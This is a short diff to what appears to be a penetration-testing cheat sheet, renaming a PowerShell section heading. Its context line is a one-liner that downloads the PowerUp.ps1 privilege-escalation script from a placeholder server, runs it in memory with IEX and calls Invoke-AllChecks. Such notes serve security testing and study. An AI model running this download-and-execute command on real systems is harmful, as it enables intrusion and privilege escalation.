@@ -1,4 +1,4 @@
-# Windows - Powershell
+# Powershell
 
 ```powershell
 powershell "IEX (New-Object Net.WebClient).DownloadString('<server>/PowerUp.ps1'); Invoke-AllChecks"
